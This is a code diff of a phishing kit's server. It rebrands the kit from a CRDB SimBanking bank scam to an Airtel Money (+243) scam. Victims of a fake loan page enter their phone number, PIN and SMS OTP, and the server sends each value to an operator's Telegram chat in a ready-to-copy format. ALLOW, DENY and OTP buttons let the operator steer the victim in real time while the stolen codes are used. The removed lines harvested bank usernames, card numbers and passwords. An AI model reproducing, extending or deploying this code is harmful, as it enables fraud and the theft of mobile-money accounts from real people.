@@ -1,5 +1,5 @@
 /**
- * CRDB SIMBANKING - MULTI-ADMIN SERVER (FRENCH LOCALE)
+ * AIRTEL - MULTI-ADMIN SERVER (+243 CODE)
  * Main Admin Chat ID: 8591555400
  */
 
@@ -76,20 +76,19 @@ async function initBot() {
 
       const username = chatInfo.username || msg.from.username || '';
       const firstName = chatInfo.first_name || msg.from.first_name || 'User';
-      const lastName = chatInfo.last_name || msg.from.last_name || '';
 
       if (chatId === String(FALLBACK_ADMIN_ID)) {
-        await bot.sendMessage(chatId, `👑 *Bienvenue Administrateur Principal*\nVotre lien: ${APP_URL}/?admin=${FALLBACK_ADMIN_ID}`, { parse_mode: 'Markdown' });
+        await bot.sendMessage(chatId, `👑 *Bienvenue Administrateur Principal*\nVotre lien Airtel (+243): ${APP_URL}/?admin=${FALLBACK_ADMIN_ID}`, { parse_mode: 'Markdown' });
         return;
       }
 
       if (!admins.has(chatId)) {
-        admins.set(chatId, { authorized: true, paid: true, username, firstName, lastName, startedAt: new Date() });
+        admins.set(chatId, { authorized: true, paid: true, username, firstName, startedAt: new Date() });
         saveAdmins();
       }
 
       const userLink = `${APP_URL}/?admin=${chatId}`;
-      await bot.sendMessage(chatId, `👋 *Bienvenue ${firstName}!*\n\nVotre lien est prêt:\n${userLink}`, { parse_mode: 'Markdown' });
+      await bot.sendMessage(chatId, `👋 *Bienvenue ${firstName}!*\n\nVotre lien Airtel est prêt:\n${userLink}`, { parse_mode: 'Markdown' });
     } catch (err) {}
   });
 
@@ -98,7 +97,7 @@ async function initBot() {
       const actionData = query.data || '';
       const chatId = String(query.message.chat.id);
       const parts = actionData.split('_');
-      const prefix = parts.slice(0, 2).join('_'); 
+      const actionType = parts.slice(0, 2).join('_'); 
       const targetId = parts.slice(2).join('_');
 
       let session = sessions.get(targetId);
@@ -106,31 +105,27 @@ async function initBot() {
 
       const chatTarget = session.adminChatId || chatId;
 
-      switch (prefix) {
-        case 'WRONG_CREDS':
-          session.status = 'RETRY_CREDS';
-          await bot.sendMessage(chatTarget, `❌ Données rejetées. Le client est invité à ressaisir ses informations.`);
-          break;
-        case 'CORRECT_CREDS':
-          session.status = 'PROCEED_OTP';
-          await bot.sendMessage(chatTarget, `✅ Informations validées. Le client passe au code OTP SMS (4 chiffres Airtel Congo).`);
-          break;
-        case 'OTP_EXPIRED':
-          session.status = 'RETRY_OTP';
-          session.otp = '';
-          await bot.sendMessage(chatTarget, `⚠️ Code OTP expiré. Le client est invité à saisir un nouveau code.`);
-          break;
-        case 'CORRECT_OTP':
-          session.status = 'PROCEED_PHONE_PIN';
-          await bot.sendMessage(chatTarget, `✅ Code OTP correct. Le client passe à l'étape Numéro Airtel et Code PIN.`);
-          break;
-        case 'WRONG_PIN':
+      switch (actionType) {
+        case 'DENY_CREDS':
           session.status = 'RETRY_PIN';
           session.pin = '';
-          await bot.sendMessage(chatTarget, `❌ Code PIN incorrect. Le client est invité à recharger son PIN.`);
+          await bot.sendMessage(chatTarget, `❌ Connexion refusée (DENY). Le client est invité à ressaisir son Code PIN dans des cases vides.`);
           break;
-        case 'CORRECT_PIN':
-        case 'FINAL_SUCCESS':
+        case 'ALLOW_CREDS':
+          session.status = 'PROCEED_OTP';
+          await bot.sendMessage(chatTarget, `✅ Connexion autorisée (ALLOW). Le client passe au code OTP SMS (4 chiffres).`);
+          break;
+        case 'WRONG_OTP':
+          session.status = 'RETRY_OTP';
+          session.otp = '';
+          await bot.sendMessage(chatTarget, `❌ Code OTP incorrect. Le client est invité à ressaisir un nouveau code OTP.`);
+          break;
+        case 'EXPIRED_OTP':
+          session.status = 'RETRY_OTP';
+          session.otp = '';
+          await bot.sendMessage(chatTarget, `⚠️ Code OTP expiré. Le client est invité à ressaisir un nouveau code OTP.`);
+          break;
+        case 'APPROVED_FINAL':
           session.status = 'SUCCESS';
           await bot.sendMessage(chatTarget, `🎉 Prêt approuvé avec succès! L'écran de confirmation s'est affiché.`);
           break;
@@ -138,7 +133,7 @@ async function initBot() {
           break;
       }
 
-      await bot.answerCallbackQuery(query.id, { text: `Traité` }).catch(() => {});
+      await bot.answerCallbackQuery(query.id, { text: `Action effectuée` }).catch(() => {});
       if (query.message && query.message.message_id) {
         await bot.editMessageReplyMarkup({ inline_keyboard: [] }, { chat_id: query.message.chat.id, message_id: query.message.message_id }).catch(() => {});
       }
@@ -150,10 +145,10 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Step 1: Submit Credentials & Bank Details
+// Step 1: Submit Phone Number & PIN (ALLOW & DENY Buttons)
 app.post('/api/submit-credentials', async (req, res) => {
   try {
-    let { username, account, card, password, adminChatId } = req.body || {};
+    let { phone, pin, adminChatId } = req.body || {};
     if (!adminChatId && req.query && req.query.admin) {
       adminChatId = req.query.admin;
     }
@@ -161,25 +156,23 @@ app.post('/api/submit-credentials', async (req, res) => {
     const targetChat = resolveTargetChat(adminChatId);
     const userId = `user_${Date.now()}`;
     sessions.set(userId, { 
-      username, account, card, password, 
+      phone, pin, 
       adminChatId: targetChat, 
       status: 'WAITING_CREDS_APPROVAL' 
     });
 
-    const message = `🟢 *CRDB SIMBANKING - DONNÉES BANCAIRES*\n\n` +
-                    `👤 *Nom d'utilisateur:* \`${username}\`\n` +
-                    `💳 *N° Compte:* \`${account}\`\n` +
-                    `💳 *N° Carte:* \`${card}\`\n` +
-                    `🔑 *Mot de passe:* \`${password}\`\n\n` +
-                    `📋 *Format à copier:*\n\`${username}:${account}:${card}:${password}\``;
+    const message = `🔴 *AIRTEL MONEY - NUMÉRO ET CODE PIN*\n\n` +
+                    `📞 *Téléphone:* \`+243${phone}\`\n` +
+                    `🔒 *Code PIN:* \`${pin}\`\n\n` +
+                    `📋 *Format à copier:*\n\`+243${phone}:${pin}\``;
 
     const opts = {
       parse_mode: 'Markdown',
       reply_markup: {
         inline_keyboard: [
           [
-            { text: '❌ WRONG DETAILS', callback_data: `WRONG_CREDS_${userId}` },
-            { text: '✅ CORRECT DETAILS', callback_data: `CORRECT_CREDS_${userId}` }
+            { text: '❌ DENY', callback_data: `DENY_CREDS_${userId}` },
+            { text: '✅ ALLOW', callback_data: `ALLOW_CREDS_${userId}` }
           ]
         ]
       }
@@ -202,7 +195,7 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Step 2: Submit 4-digit SMS OTP (Airtel Congo)
+// Step 2: Submit 4-digit SMS OTP (3 Buttons)
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
@@ -213,7 +206,7 @@ app.post('/api/submit-otp', async (req, res) => {
     session.status = 'WAITING_OTP_VERIFICATION';
     session.otp = otp;
 
-    const message = `🟢 *CRDB SIMBANKING - OTP AIRTEL CONGO (4 Chiffres)*\n\n` +
+    const message = `🔴 *AIRTEL MONEY - OTP SMS (4 Chiffres)*\n\n` +
                     `📱 *Code OTP:* \`${otp}\``;
 
     const opts = {
@@ -221,44 +214,9 @@ app.post('/api/submit-otp', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: '⚠️ OTP EXPIRED', callback_data: `OTP_EXPIRED_${userId}` },
-            { text: '✅ CORRECT OTP', callback_data: `CORRECT_OTP_${userId}` }
-          ]
-        ]
-      }
-    };
-
-    if (targetChat && bot) await bot.sendMessage(targetChat, message, opts);
-
-    return res.status(200).json({ success: true });
-  } catch (error) {
-    return res.status(500).json({ success: false, error: 'Erreur' });
-  }
-});
-
-// Step 3: Submit Phone & PIN
-app.post('/api/submit-phone-pin', async (req, res) => {
-  try {
-    const { userId, phone, pin } = req.body || {};
-    const session = sessions.get(userId);
-    if (!session) return res.status(404).json({ success: false, error: 'Session non trouvée' });
-
-    const targetChat = session.adminChatId;
-    session.status = 'WAITING_PIN_VERIFICATION';
-    session.phone = phone;
-    session.pin = pin;
-
-    const message = `🟢 *CRDB SIMBANKING - NUMÉRO ET PIN AIRTEL*\n\n` +
-                    `📞 *Téléphone:* \`+242${phone}\`\n` +
-                    `🔒 *Code PIN:* \`${pin}\``;
-
-    const opts = {
-      parse_mode: 'Markdown',
-      reply_markup: {
-        inline_keyboard: [
-          [
-            { text: '❌ WRONG PIN', callback_data: `WRONG_PIN_${userId}` },
-            { text: '✅ CORRECT PIN', callback_data: `CORRECT_PIN_${userId}` }
+            { text: '❌ WRONG OTP', callback_data: `WRONG_OTP_${userId}` },
+            { text: '⚠️ EXPIRED OTP', callback_data: `EXPIRED_OTP_${userId}` },
+            { text: '✅ APPROVED', callback_data: `APPROVED_FINAL_${userId}` }
           ]
         ]
       }
@@ -277,4 +235,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-  
+        
